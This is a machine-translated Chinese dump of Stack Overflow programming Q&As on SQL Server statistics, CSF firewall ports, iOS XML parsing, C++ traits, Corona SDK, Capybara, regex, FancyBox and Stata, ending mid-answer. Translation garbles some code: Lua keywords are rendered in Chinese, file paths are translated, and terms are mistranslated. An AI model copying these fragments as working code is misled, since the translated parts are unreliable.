> 时间：2013-05-15T00:51:43.870

正如@JanDrozen 所说，它很可能是统计问题。当数据大小超过某个阈值时，生成的执行计划不再是最佳计划，但统计数据不允许它获得正确的估计行数。优化器并不总是生成最佳执行计划。这是一项令人印象深刻的编程成就壮举，通常可以从我们的谷壳中获得金子，但它确实只能利用手头的数据做到最好。它使用 carnality 统计数据，并将使用估计的结果集大小来确定它认为最好的计划。

在不尝试首先更新统计信息的情况下判断它是否是统计信息问题的一种方法是启用实际的执行计划，并查看属性。

检查：

*   在数据进入管道的地方，估计的行数接近实际的行数。
*   执行计划的属性表明优化器达到了最佳计划。在属性中，它将告诉您为什么选择该计划。有时，如果统计数据已经过时，优化器永远不会找到最佳计划，而只能使用它可以找到的最佳计划。

此查询是更新示例 Adventureworks 数据库中的统计信息的示例。

```
USE AdventureWorks2012;
GO
UPDATE STATISTICS Production.Product(Products)
    WITH FULLSCAN, NORECOMPUTE;
GO 
```

有一个存储过程`sp_updatestats [ [ @resample = ] 'resample']` ，但我从来没有用它得到很好的结果，我永远不能强迫它通过全面扫描进行更新，根据我的经验，这是获得良好统计数据的最佳方式。

如果您需要对大量表执行此操作，这是我之前使用过的脚本，用于使用动态 sql 重新生成统计信息。

```
DECLARE @sql nvarchar(MAX);
SELECT @sql = (SELECT 'UPDATE STATISTICS ' +
                  quotename(s.name) + '.' + quotename(o.name) +
                  ' WITH FULLSCAN; ' AS [text()]
           FROM   sys.objects o
           JOIN   sys.schemas s ON o.schema_id = s.schema_id
           WHERE  o.type = 'U'
           FOR XML PATH(''), TYPE).value('.', 'nvarchar(MAX)');
PRINT @sql
EXEC (@sql) 
```

[这](http://blog.idera.com/sql-server/understanding-sql-server-statistics/)是一篇关于统计的好文章，并对它们是什么、它们做什么以及如何看待它们进行了很好的细分。

# cpanel - cPanel/WHm 中的 CSF 安装问题

> ID：16013946
> 
> 赞同：0
> 
> 时间：2013-04-15T11:24:27.667
> 
> 标签：cpanel, firewall, whm

我已经成功安装了 csf，`cPanel/whm`但我的问题是当我启用`csf`防火墙时。它阻止所有传入和传出的请求，所以没有人可以打开他们的域名、ftp 或任何东西。我对此一无所知，所以如果有人可以指导我逐步配置`csf`.`cPanel/whm`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-06T12:24:55.427

确保在您的 csf.conf 中进行以下设置

> 测试 = "0"
> 
> TESTING_INTERVAL = 默认值：5
> 
> TCP_IN = 20,21,22,25,53,80,110,143,443,465,587,993,995,2077,2078,2082,2083,2086,2087,2095,2096,26
> 
> TCP_OUT = 20,21,22,25,37,43,53,80,110,113,443,587,873,2087,2089,2703,3306
> 
> UDP_IN = 20,21,53
> 
> UDP_OUT = 20,21,53,113,123,873,6277
> 
> ICMP_IN = 默认值：1
> 
> ICMP_OUT = 默认值：1
> 
> SMTP_PORTS = 25 36

# iphone - iOS中的xml解析具有太多同名标签

> ID：16013953
> 
> 赞同：0
> 
> 时间：2013-04-15T11:24:34.377
> 
> 标签：iphone, ios, xcode, cocoa-touch, xml-parsing

我已经得到了 xml 解析，但是解析下面的 xml 有点困难，感谢您的建议

```
<?xml version="1.0" encoding="UTF-8"?>
<AllJobs>
    <Mainjobs>
     <job1 name="simple">
     <Group name="one">
        <item name>"itemone"</item name>
        <item name>"itemtwo"</item name>
        <item name>"itemthree"</item name>
      </Group>
      <Group name="two">
        <item name>"itemfour"</item name>
        <item name>"itemfive"</item name>
        <item name>"itemsix"</item name>
      </Group>
    </job1>
    <job2 name="medium" />
    </job2>
    <job3 name="hard" />
    </job3>
    </Mainjobs>
</AllJobs> 
```

从上面的 xml 我试图解析下面的项目名称是“项目四，项目五，项目六”，并在表格视图中显示它们

```
<Group name="two">
    <item>"itemfour"</item>
    <item>"itemfive"</item>
    <item>"itemsix"</item> 
```

我正在这样解析，但它正在检索每个组标签中的所有项目名称

```
-(void)parser:(NSXMLParser *)parser didStartElement:(NSString *)elementName namespaceURI:(NSString *)namespaceURI qualifiedName:(NSString *)qName attributes:(NSDictionary *)attributeDict {

if([elementName isEqualToString:@"Alljobs"]){
    jobNameArray=[[NSMutableArray alloc]init];

}else if([elementName isEqualToString:@"Mainjobs"]){
    //  self.itemDict = [[NSMutableDictionary alloc] init];
    object=[[parseObject alloc]init];
    dict=[[NSMutableDictionary alloc] init];
}
      else if([elementName isEqualToString:@"Group"])
    {
 if ([str isEqualToString:@"Two"]) {
            currentElement=nil;
            currentElement=[[NSMutableString alloc]init];
        }
    }
   else if([elementName isEqualToString:@"item"])
    {
        str=[attributeDict objectForKey:@"name"];
        NSLog(@"the attribute string is %@",[attributeDict objectForKey:@"name"]);
    } 
```

}

```
 -(void)parser:(NSXMLParser *)parser foundCharacters:(NSString *)string {
    if(string){
            [currentElement appendString:string];
    NSLog(@"  the element00000000%@", currentElement);
} 
```

}

```
 -(void)parser:(NSXMLParser *)parser didEndElement:(NSString *)elementName namespaceURI:    (NSString *)namespaceURI qualifiedName:(NSString *)qName {
    if([elementName isEqualToString:@"Mainjobs"]){
        NSLog(@"the array count is %i",[jobNameArray count]);
}
else if([elementName isEqualToString:@"Job1"])
{

}
if([elementName isEqualToString:@"</item>"])
{
            NSLog(@"element ---------%@",elementName);

[jobNameArray addObject:str];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:42:45.433

通过使用 NSXmlParser，这更加困难，因为它通过可区分的标签来查找字符。我也面临同样的问题。那个时候我通过维护深度变量解决了这个问题。通过查看你的 xml，工作属性对我来说似乎不合适，因为**如果你有 n 个工作，那么你在什么基础上比较这些？**但就您而言，我认为您可以实现以下目标：

1.  创建一个名为 job 的类。

2.  具有以下属性的作业类：

    工作名称：NSString；组名：NSString；项目：NSMutableArray；

3.  将此 Job 对象添加到数组中。

# macos - 使用 qtmovieview 在 mac 应用程序中播放视频

> ID：16013955
> 
> 赞同：0
> 
> 时间：2013-04-15T11:24:43.477
> 
> 标签：macos

我写过这样的代码

```
NSString *path = [[NSBundle mainBundle] pathForResource:@"iOS app development " ofType:@"mp4"];

NSLog(@" path   %@",path);

NSURL *url = [NSURL fileURLWithPath:path] ;
movie1 = [QTMovie movieWithURL:url error:nil];

[Movieview setMovie:movie1];

[[Movieview movie]play]; 
```

当我运行应用程序时，只有音频正在播放。如果有人知道答案，请帮助我

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T08:40:04.883

添加

```
[[movie1 window] makeKeyAndOrderFront:self]; 
```

它应该可以解决您的问题

# c++ - C++ 改变具有特征的模板方法的行为

> ID：16013961
> 
> 赞同：0
> 
> 时间：2013-04-15T11:25:00.653
> 
> 标签：c++, templates, traits

我有一个`template`，我有方法`T get(int i)`和`set(int i, T val)`。我必须使特征类改变的不是行为，而是改变的`set`争论`get`。

```
template<typename T,int Roz>
class Wektor{
public:
 T tab[Roz];
 T get(int i)
 {
     return tab[i];
 }
 void set(T val,int i)
 {
     tab[i]=val;
 }
 } 
```

所以traits类必须改变get和set。如果 T 是 int 或 double 我们通过复制 int 获得参数

```
 int get(int i);
 void set(int val,int i); 
```

双倍的

```
 double get(int i);
 void set(double val,int i); 
```

对于其他类型：

```
T* get(int i);
void set(T* val,int i); 
```

我们必须在特征中做到这一点，而不是通过模板的专门化。

所以我这样写 tratis：

```
template<typename T,int Roz>
class traitsWektor
{
public:
T tab[Roz];
T get(int i)
{
    return tab[i];
}
void set(T val,int i)
{
    tab[i]=val;
}
} 
```

所以我在这里卡住了。我想我应该做

```
template<typename T, int Roz>
class Wektor : public traitsWektor<T,Roz> 
```

但我不确定这是否正确，仍然是 tratis。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:33:28.400

您应该将类​​模板（Wektor）和参数类型推导分开：

```
template <class T>
struct WektorParamTraits {
  typedef T const& type;

  //or if you might have different types as getter return type and setter arg
  typedef T const& getterReturn;
  typedef T const& setterArg;
}; 
```

在这种情况下， T 是您的 getter/setter 参数的“默认”类型。将其专门用于您需要的任何类型。类定义现在应该如下所示：

```
template<typename T,int Roz>
class Wektor{
  T tab[Roz]; //make member variables private
public:
  typename WektorParamTraits<T>::getterReturn get(int i) //const?
  {
    return tab[i];
  }

  void set(typename WektorParamTraits<T>::setterArg val,int i)
  {
    tab[i]=val;
  }
}; 
```

**更新：**如评论中所述，您可能需要为 get 和 set 定义其他实现，例如，如果您的返回类型是指针。有几种不同的方法可以做到这一点：

1.  `tab[i]`在特征中定义函数以在和参数/返回值之间正确转换。
2.  如果它只是关于指针和非指针，请提供两个版本的 getter 和 setter，并使用`std::enable_if`with`std::is_pointer`以及禁用其中一个所需的任何其他内容。
3.  使用您在此处发布的简单类定义，并将其专门用于不使用通常引用的少数类型。任何进一步的功能都应该进入一个非专业的子类。

方法 2 会非常冗长且难以阅读。方法 1 也很冗长，因为除了数组定义之外，您几乎可以将*所有内容*委托给该特征类，因此您也可以使用方法 3，因为这并不太远。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T11:40:49.957

我认为这个模板可以帮助你：

```
template<typename T>
class traits
{
public:
    typedef T * result;
};

template<>
class traits<int>
{
public:
    typedef int result;
};

template<>
class traits<double>
{
public:
    typedef double result;
};

traits<int>::result; // is int.
traits<char>::result; // is char *. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:41:35.123

我不确定你想如何实现`set(T*,int)`。但`get`你可能想试试这个

```
template<typename T, size_t Roz>
class Wektor
{
public:
    template<typename U=T>
    typename std::enable_if<std::is_arithmetic<U>::value, U>::type 
        Get(size_t n)
    { 
        return tab[n];
    }

    template<typename U=T>
    typename std::enable_if<!std::is_arithmetic<U>::value, U*>::type 
        Get(size_t n)
    { 
        return &tab[n];
    }

    T tab[Roz];
}; 
```

# coronasdk - corona sdk - 场景保留旧物品

> ID：16013972
> 
> 赞同：0
> 
> 时间：2013-04-15T11:25:37.580
> 
> 标签：coronasdk

我正在使用 director 从一个场景移动到另一个场景。我有一个问题，当移动到任何场景时，来自 intor 的按钮和文本字段仍在屏幕顶部。

如何在移动到下一个场景之前删除项目（文本字段，intro.lua 屏幕中的 btns）？

```
 enter code here    
-- into.lua
module(..., package.seeall)
function new()
--
-- Project: NativeKeyboard2
--

local widget = require( "widget" )

require("hijacks")

local tHeight       -- forward reference

-------------------------------------------
-- General event handler for fields
-------------------------------------------

-- You could also assign different handlers for each textfield

local function fieldHandler( textField )
    return function( event )
        if ( "began" == event.phase ) then
            -- This is the "keyboard has appeared" event
            -- In some cases you may want to adjust the interface when the keyboard appears.

        elseif ( "ended" == event.phase ) then
            -- This event is called when the user stops editing a field: for example, when they touch a different field

        elseif ( "editing" == event.phase ) then

        elseif ( "submitted" == event.phase ) then
            -- This event occurs when the user presses the "return" key (if available) on the onscreen keyboard
            print( textField().text )

            -- Hide keyboard
            native.setKeyboardFocus( nil )
        end
    end
end

-- Predefine local objects for use later
local nameField, phoneField
local fields = display.newGroup()

-------------------------------------------
-- *** Create native input textfields ***
-------------------------------------------

-- Note: currently this feature works in device builds or Xcode simulator builds only (also works on Corona Mac Simulator)
local isAndroid = "Android" == system.getInfo("platformName")
local inputFontSize = 18
local inputFontHeight = 30
tHeight = 30

if isAndroid then
    -- Android text fields have more chrome. It's either make them bigger, or make the font smaller.
    -- We'll do both
    inputFontSize = 14
    inputFontHeight = 42
    tHeight = 40
end

nameField = native.newTextField( 40, 120, 200, tHeight )
nameField.font = native.newFont( native.systemFontBold, inputFontSize )
nameField:addEventListener( "userInput", fieldHandler( function() return nameField end ) ) 

phoneField = native.newTextField( 40, 160, 200, tHeight )
phoneField.font = native.newFont( native.systemFontBold, inputFontSize )
phoneField.inputType = "phone"
phoneField:addEventListener( "userInput", fieldHandler( function() return phoneField end ) ) 

-- Add fields to our new group
fields:insert(nameField)
fields:insert(phoneField)

-------------------------------------------
-- *** Add field labels ***
-------------------------------------------

local defaultLabel = display.newText( "الاسم", 250, 120, native.systemFont, 18 )
defaultLabel:setTextColor( 255, 0, 0 )

local defaultLabel = display.newText( "رقم الجوال", 250, 160, native.systemFont, 18 )
defaultLabel:setTextColor( 255, 0, 0 )

-- -------------------------------------------
-- -- Create a Background touch event
-- -------------------------------------------

local listener = function( event )
    -- Hide keyboard
    print("tap pressed")
    native.setKeyboardFocus( nil )

    return true
end

-- Determine if running on Corona Simulator
--
local isSimulator = "simulator" == system.getInfo("environment")
if system.getInfo( "platformName" ) == "Mac OS X" then isSimulator = false; end

-- Native Text Fields not supported on Simulator
--
if isSimulator then
msg = display.newText( "الرجاء ادخال اسمك ورقم جوالك", 0, 280, native.systemFontBold, 12 )
msg.x = display.contentWidth/2      -- center title
msg:setTextColor( 255,0,0 )
end

-- -- Add listener to background for user "tap"
-- bkgd:addEventListener( "tap", listener )
-- display.remove( obj )
-- obj = nil    

local introGroup = display.newGroup();

    local background = display.newImage("graphics/intro_background.png")        
    local begin = display.newImage("graphics/begin_button.png")
    begin.x = 160; 
    begin.y = 400;
    begin.scene = "menu";

    introGroup:insert(background);
    introGroup:insert(begin);

    begin:addEventListener("touch", changeScene)

return introGroup;

end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T04:45:25.787

Corona 提供了一个非常好的功能，那就是“故事板”。我给你一个简单的解释，试试这个 -

*   Storyboard - 它是一个场景（例如“屏幕”或“视图”）管理库，为开发人员提供了一种在 Corona SDK 应用程序中创建和转换场景模块的简单方法。

    语法 - 本地故事板 = 需要“故事板”

    示例 -
    本地场景 1 = storyboard.newScene(“场景名称”)

    以下是故事板中使用的不同事件 -

    **1- 创建场景 -**
    -- 当场景的视图不存在时调用：

    功能场景：createScene（事件）本地组= self.view end

    **2-进入场景--** 在场景移动到屏幕后立即调用：

    功能场景：enterScene（事件）本地组= self.view end

    **3- Exit Scene -** -- 当场景即将移出屏幕时调用：

    功能场景：exitScene（事件）本地组= self.view

    结尾

    **4 - Destroy Scene -** -- 在移除场景的“视图”（显示组）之前调用

    功能场景：destroyScene（事件）本地组= self.view end

它会帮助你。

# ruby-on-rails - Capybara + 远程表单请求

> ID：16013975
> 
> 赞同：5
> 
> 时间：2013-04-15T11:25:44.503
> 
> 标签：ruby-on-rails

我有一个表格，我正在使用 Capybara 进行测试。此表单的 URL 会转到我的 Braintree 沙箱，尽管我怀疑任何远程 URL 都会出现问题。当 Capybara 单击表单的提交按钮时，请求被路由到虚拟应用程序而不是远程服务。

这是一个重现此问题的示例应用程序：[https](https://github.com/radar/capybara_remote) ://github.com/radar/capybara_remote 。运行 bundle exec ruby​​ test/form_test.rb 并且测试将通过，这不是我通常所期望的。

为什么会发生这种情况，我可以依赖的这种行为是否总是发生？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-15T22:35:01.357

Mario Visic 在 Capybara 文档中指出了这个描述：

> 此外，您不能使用 RackTest 驱动程序来测试远程应用程序，或访问您的应用程序可能与之交互的远程 URL（例如，重定向到外部站点、外部 API 或 OAuth 服务）。

但我想知道为什么，所以我开始潜水。这是我的发现：

**lib/capybara/node/actions.rb**

```
def click_button(locator)
  find(:button, locator).click
end 
```

我不在乎`find`这里，因为那行得通。这才是`click`更有趣的。该方法定义如下：

**lib/capybara/node/element.rb**

```
def click
  wait_until { base.click }
end 
```

我不知道是什么，但我看到该方法在and`base`中又定义了两次。测试使用的是Selenium 而不是 Selenium，所以它可能是前者：`lib/capybara/rack_test/node.rb``lib/capybara/selenium/node.rb``Rack::Test`

**lib/capybara/rack_test/node.rb**

```
def click
  if tag_name == 'a'
    method = self["data-method"] if driver.options[:respect_data_method]
    method ||= :get
    driver.follow(method, self[:href].to_s)
  elsif (tag_name == 'input' and %w(submit image).include?(type)) or
    ((tag_name == 'button') and type.nil? or type == "submit")
    Capybara::RackTest::Form.new(driver, form).submit(self)
  end
end 
```

可能不是链接——因为它是我们正在单击的`tag_name`按钮——所以它属于`elsif`. 这绝对是一个`input`带有 的标签`type == "submit"`，那么让我们看看是什么`Capybara::RackTest::Form`：

**lib/capybara/rack_test/form.rb**

```
def submit(button)
  driver.submit(method, native['action'].to_s, params(button))
end 
```

那好吧。`driver`可能是`Rack::Test`水豚的驱动程序。那是在做什么？

**lib/capybara/rack_test/driver.rb**

```
def submit(method, path, attributes)
  browser.submit(method, path, attributes)
end 
```

这个神秘的浏览器是什么？谢天谢地，它在同一个文件中定义：

```
def browser
  @browser ||= Capybara::RackTest::Browser.new(self)
end 
```

让我们看看这个类的`submit`方法做了什么。

**lib/capybara/rack_test/browser.rb**

```
def submit(method, path, attributes)
  path = request_path if not path or path.empty?
  process_and_follow_redirects(method, path, attributes, {'HTTP_REFERER' => current_url})
end 
```

`process_and_follow_redirects`做它在盒子上说的：

```
def process_and_follow_redirects(method, path, attributes = {}, env = {})
  process(method, path, attributes, env)
  5.times do
    process(:get, last_response["Location"], {}, env) if last_response.redirect?
  end
  raise Capybara::InfiniteRedirectError, "redirected more than 5 times, check for infinite redirects." if last_response.redirect?
end 
```

也是如此`process`：

```
def process(method, path, attributes = {}, env = {})
  new_uri = URI.parse(path)
  method.downcase! unless method.is_a? Symbol

  if new_uri.host
    @current_host = "#{new_uri.scheme}://#{new_uri.host}"
    @current_host << ":#{new_uri.port}" if new_uri.port != new_uri.default_port
  end

  if new_uri.relative?
    if path.start_with?('?')
      path = request_path + path
    elsif not path.start_with?('/')
      path = request_path.sub(%r(/[^/]*$), '/') + path
    end
    path = current_host + path
  end

  reset_cache!
  send(method, path, attributes, env.merge(options[:headers] || {}))
end 
```

是时候打开调试器看看`method`这里有什么了。`binding.pry`在该方法的最后一行之前粘贴 a ，并`require 'pry'`在测试中粘贴 a 。事实证明，`method`并且`:post`，为了感兴趣，`new_uri`它是一个`URI`带有我们远程表单 URL 的对象。

这种`post`方法从何而来？`method(:post).source_location`告诉我：

```
["/Users/ryan/.rbenv/versions/1.9.3-p374/lib/ruby/1.9.1/forwardable.rb", 199] 
```

这似乎不对……水豚有什么`def post`地方吗？

```
capybara (master)★ack "def post"
lib/capybara/rack_test/driver.rb
76:  def post(*args, &block); browser.post(*args, &block); end 
```

凉爽的。我们知道`browser is a`Capybara::RackTest::Browser` 对象。课程开头给出了下一个提示：

```
class Capybara::RackTest::Browser
  include ::Rack::Test::Methods 
```

我知道这`Rack::Test::Methods`是有`post`方法的。是时候潜入那颗宝石了。

**库/机架/test.rb**

```
def post(uri, params = {}, env = {}, &block)
  env = env_for(uri, env.merge(:method => "POST", :params => params))
  process_request(uri, env, &block)
end 
```

`env_for`暂时不理会，有什么作用`process_request`呢？

**库/机架/test.rb**

```
def process_request(uri, env)
  uri = URI.parse(uri)
  uri.host ||= @default_host

  @rack_mock_session.request(uri, env)

  if retry_with_digest_auth?(env)
    auth_env = env.merge({
      "HTTP_AUTHORIZATION"          => digest_auth_header,
      "rack-test.digest_auth_retry" => true
    })
    auth_env.delete('rack.request')
    process_request(uri.path, auth_env)
  else
    yield last_response if block_given?

    last_response
  end
end 
```

嘿，`@rack_mock_session`看起来很有趣。这是在哪里定义的？

```
rack-test (master)★ack "@rack_mock_session ="
lib/rack/test.rb
40:          @rack_mock_session = mock_session
42:          @rack_mock_session = MockSession.new(mock_session) 
```

在两个地方，彼此非常接近。这些线路上和周围有什么？

```
def initialize(mock_session)
  @headers = {}

  if mock_session.is_a?(MockSession)
    @rack_mock_session = mock_session
  else
    @rack_mock_session = MockSession.new(mock_session)
  end

  @default_host = @rack_mock_session.default_host
end 
```

好的，所以它确保它是一个`MockSession`对象。它的方法是什么`MockSession`以及如何`request`定义的？

```
def request(uri, env)
  env["HTTP_COOKIE"] ||= cookie_jar.for(uri)
  @last_request = Rack::Request.new(env)
  status, headers, body = @app.call(@last_request.env)
  headers["Referer"] = env["HTTP_REFERER"] || ""

  @last_response = MockResponse.new(status, headers, body, env["rack.errors"].flush)
  body.close if body.respond_to?(:close)

  cookie_jar.merge(last_response.headers["Set-Cookie"], uri)

  @after_request.each { |hook| hook.call }

  if @last_response.respond_to?(:finish)
    @last_response.finish
  else
    @last_response
  end
end 
```

我将在这里继续并假设`@app`是 Rack 应用程序堆栈。通过调用该`call`方法，请求被直接路由到这个堆栈，而不是向外发送。

我得出的结论是，这种行为看起来像是故意的，而且我确实可以依靠这种方式。

# regex - 正则表达式匹配除两个域之外的任何域

> ID：16013976
> 
> 赞同：1
> 
> 时间：2013-04-15T11:25:45.970
> 
> 标签：regex

在我的 htaccess 中，我试图将所有公园域的文档根目录设置为除两个主要域之外的特定路径，所以基本上我需要一个正则表达式来匹配除两个域之外的任何域我发现类似这样的内容

```
^(?!foo$|bar$).* 
```

和这个

```
(?>[\w-]+)(?<!tea|nuka-cola) 
```

但无法让它适用于我的情况，因为域名中有一个**点 tld ，我也想在那里使用正则表达式 这是我当前的正则表达式**

```
^(.*?)\.(com|net)$ 
```

而不是 (.*?) 我想在那里例外

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:30:32.153

使用负面的看法：

```
^(.*?)(?<!(foo)|(bar))\.(com|net)$ 
```

不知道你想要什么，但这个正则表达式将不匹配以`foo.com`or`bar.net`等​​结尾的网址

# jquery - FancyBox 文本输入已禁用

> ID：16013981
> 
> 赞同：0
> 
> 时间：2013-04-15T11:25:53.707
> 
> 标签：jquery, html, fancybox

我刚刚开始使用 FancyBox，目前正在尝试在其中创建一系列输入字段。我发现使用以下代码（非常精简以尝试找出问题所在）当 FancyBox 显示时，**input[type='text']**元素不可编辑，我不知道为什么。

HTML 标记：

```
<div id="divFancyBoxTest">
    <input type="text" id="something" value="test" />
</div> 
```

JS：

```
$.fancybox.open($("#divFancyBoxTest")); 
```

..在下图中，输入控件不可访问。

![在此处输入图像描述](https://i.stack.imgur.com/YEtZF.png)

有人知道为什么吗？我一直在研究所有 CSS 和相关代码，但我不知道为什么会这样。

花式盒子 v2.1.4

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T15:06:34.217

看看这个：http: [//jsfiddle.net/steelywing/uZCC6/2263/](http://jsfiddle.net/steelywing/uZCC6/2263/)

```
$.fancybox.open([{
    content: $('#divFancyBoxTest').html(),
    title: 'Input box'
}, ], {
    padding: 0
}); 
```

# stata - Bioprobit - Beta 的协方差矩阵

> ID：16013984
> 
> 赞同：0
> 
> 时间：2013-04-15T11:26:04.540
> 
> 标签：stata

我正在比较穆迪和标准普尔的信用评级决定因素的权重。进行 bioprobit 分析的目的是测试穆迪和标准普尔之间的贝塔系数是否相同。我想根据 Wald 测试执行此操作，但我需要 Beta 的协方差矩阵。你能帮我看看Stata如何获得协方差矩阵的代码吗？

进入模型的变量是 S&Prat Mrat GDP Inflation Ratio 等

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T12:45:27.880

基于`@Nick Cox:`

示例来自`Stata data`（您需要安装`bioprobit`用户编写的命令）

```
sysuse auto 
bioprobit headroom foreign price length mpg turn

. bioprobit headroom foreign price length mpg turn

group(forei |
        gn) |      Freq.     Percent        Cum.
------------+-----------------------------------
          1 |         52       70.27       70.27
          2 |         22       29.73      100.00
------------+-----------------------------------
      Total |         74      100.00

initial:       log likelihood =  -148.5818
rescale:       log likelihood =  -148.5818
rescale eq:    log likelihood = -147.44136
Iteration 0:   log likelihood = -147.44136  
Iteration 1:   log likelihood = -147.43958  
Iteration 2:   log likelihood = -147.43958  

Bivariate ordered probit regression               Number of obs   =         74
                                                  Wald chi2(4)    =      22.61
Log likelihood = -147.43958                       Prob > chi2     =     0.0002

------------------------------------------------------------------------------
             |      Coef.   Std. Err.      z    P>|z|     [95% Conf. Interval]
-------------+----------------------------------------------------------------
headroom     |
       price |  -.0000664   .0000478    -1.39   0.164      -.00016    .0000272
      length |   .0347597    .013096     2.65   0.008      .009092    .0604274
         mpg |  -.0118916   .0354387    -0.34   0.737    -.0813502    .0575669
        turn |  -.0333833   .0554614    -0.60   0.547    -.1420857    .0753191
-------------+----------------------------------------------------------------
foreign      |
       price |   .0003981   .0001485     2.68   0.007     .0001071    .0006892
      length |  -.0585548   .0284639    -2.06   0.040     -.114343   -.0027666
         mpg |  -.0306867   .0543826    -0.56   0.573    -.1372745    .0759012
        turn |  -.3471526   .1321667    -2.63   0.009    -.6061946   -.0881106
-------------+----------------------------------------------------------------
athrho       |
       _cons |    .053797   .3131717     0.17   0.864    -.5600082    .6676022
-------------+----------------------------------------------------------------
      /cut11 |    2.72507   2.451108                     -2.079014    7.529154
      /cut12 |   3.640296   2.445186                     -1.152181    8.432772
      /cut13 |   4.227321   2.443236                      -.561334    9.015975
      /cut14 |   4.792874   2.452694                     -.0143182    9.600067
      /cut15 |   5.586825   2.480339                      .7254488     10.4482
      /cut16 |   6.381491   2.505192                      1.471404    11.29158
      /cut17 |   7.145783   2.529663                      2.187735    12.10383
      /cut21 |  -21.05768    6.50279                     -33.80292   -8.312449
-------------+----------------------------------------------------------------
         rho |   .0537452   .3122671                     -.5079835    .5834004
------------------------------------------------------------------------------
LR test of indep. eqns. :            chi2(1) =     0.03   Prob > chi2 = 0.8636

# results that are in `Stata's memory` 

ereturn list

scalars:
                 e(rc) =  0
                 e(ll) =  -147.4395814769408
          e(converged) =  1
               e(rank) =  17
                  e(k) =  17
               e(k_eq) =  11
               e(k_dv) =  2
                 e(ic) =  2
                  e(N) =  74
         e(k_eq_model) =  1
               e(df_m) =  4
               e(chi2) =  22.60944901065799
                  e(p) =  .0001515278365065
               e(ll_0) =  -147.4543291018424
              e(k_aux) =  8
             e(chi2_c) =  .0294952498030625
                e(p_c) =  .8636405133599019

macros:
            e(chi2_ct) : "LR"
             e(depvar) : "headroom foreign"
            e(predict) : "bioprobit_p"
                e(cmd) : "bioprobit"
           e(chi2type) : "Wald"
                e(vce) : "oim"
                e(opt) : "ml"
              e(title) : "Bivariate ordered probit regression"
          e(ml_method) : "d2"
               e(user) : "bioprobit_d2"
           e(crittype) : "log likelihood"
          e(technique) : "nr"
         e(properties) : "b V"

matrices:
                  e(b) :  1 x 17
                  e(V) :  17 x 17
           e(gradient) :  1 x 17
               e(ilog) :  1 x 20

functions:
             e(sample)   

#You need to use mat list e(V) to display the variance covariance matrix

mat list e(V)

symmetric e(V)[17,17]
                   headroom:   headroom:   headroom:   headroom:    foreign:    foreign:    foreign:    foreign:
                      price      length         mpg        turn       price      length         mpg        turn
 headroom:price   2.280e-09
headroom:length  -1.431e-07   .00017151
   headroom:mpg   3.991e-07   .00018914    .0012559
  headroom:turn   4.426e-07  -.00050302   .00027186   .00307597
  foreign:price   1.124e-10  -4.999e-09   2.093e-08   2.079e-08   2.205e-08
 foreign:length  -5.846e-09   8.021e-06   9.950e-06   -.0000249  -2.087e-06   .00081019
    foreign:mpg   1.712e-08   .00001035   .00006387   .00001352   1.254e-06    .0006546   .00295746
   foreign:turn   1.145e-08  -.00002418   .00001022   .00015562  -.00001083  -.00028103   -.0001411   .01746805
   athrho:_cons   2.360e-07  -.00004531    .0000684   .00005575  -2.010e-06   .00043717  -.00147713  -.00449239
    cut11:_cons    .0000134   .01507955   .07578798   .03653671   1.039e-06   .00068972   .00401168   .00211706
    cut12:_cons   .00001374   .01514192   .07570527   .03630636   9.488e-07    .0007133   .00386727   .00165474
    cut13:_cons   .00001393   .01520261   .07550433   .03603257   9.668e-07    .0007088   .00386171   .00165557
    cut14:_cons   .00001363   .01539981   .07532214   .03582323   1.042e-06   .00068687   .00392914   .00189195
    cut15:_cons   .00001264   .01584186   .07541396   .03541453   1.101e-06   .00068091    .0040106   .00209853
    cut16:_cons   .00001148   .01611862   .07562328   .03535426   1.052e-06   .00069849   .00401805   .00206701
    cut17:_cons   .00001055   .01602514   .07547739   .03620485   9.866e-07   .00069868   .00399718   .00207143
    cut21:_cons   4.412e-07   .00073781   .00377201   .00190456  -.00058242   .13231539   .18778679   .51179829

                     athrho:      cut11:      cut12:      cut13:      cut14:      cut15:      cut16:      cut17:
                      _cons       _cons       _cons       _cons       _cons       _cons       _cons       _cons
   athrho:_cons   .09807649
    cut11:_cons   -.0064343   6.0079319
    cut12:_cons   .00229188   5.9652808   5.9789347
    cut13:_cons   .00187855   5.9546524   5.9639617   5.9694026
    cut14:_cons  -.00310632   5.9724552   5.9793328   5.9820512   6.0157096
    cut15:_cons  -.00783593   6.0300908     6.03522   6.0360956   6.0667389   6.1520838
    cut16:_cons  -.00756313   6.0745198   6.0789515   6.0788816   6.1081885   6.1880183    6.275988
    cut17:_cons  -.00673882   6.0811477   6.0851101   6.0844209   6.1128719   6.1897756   6.2679698   6.3991936
    cut21:_cons  -.13478036   .30582954   .28918756   .28844026   .29527602   .30401845   .30575462   .30503648

                      cut21:
                      _cons
    cut21:_cons   42.286275

# If you want to use variance covariance matrix of first four variables

mat kk=e(V)
mat kkk=kk[1..4,1..4]
mat list kkk

symmetric kkk[4,4]
                   headroom:   headroom:   headroom:   headroom:
                      price      length         mpg        turn
 headroom:price   2.280e-09
headroom:length  -1.431e-07   .00017151
   headroom:mpg   3.991e-07   .00018914    .0012559
  headroom:turn   4.426e-07  -.00050302   .00027186   .00307597 
```

# javascript - 使用调用 JavaScript 函数名称我在 asp.net 中有一个网格。在这个网格中，我正在添加分页。在分页页脚中，我正在动态显示一个下拉列表。下拉列表包含值 (10,25,50,100)。现在我想捕获下拉值并根据该值更改页面样式。但是在这里我没有得到下拉列表的任何 id。这是我的选择代码 <select style="text-align:right;" onchange="javascript:setTimeout('__doPostBack(\'ctl00$ContentP

> ID：16013989
> 
> 赞同：0
> 
> 时间：2013-04-15T11:26:20.603
> 
> 标签：javascript, jquery

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T12:38:16.113

html:

```
<select id="ftselect">
<option value="MostRecent">MostRecent</option>
<option value="MostLiked">MostLiked</option> 
 <option value="Relavance">Relavance</option>
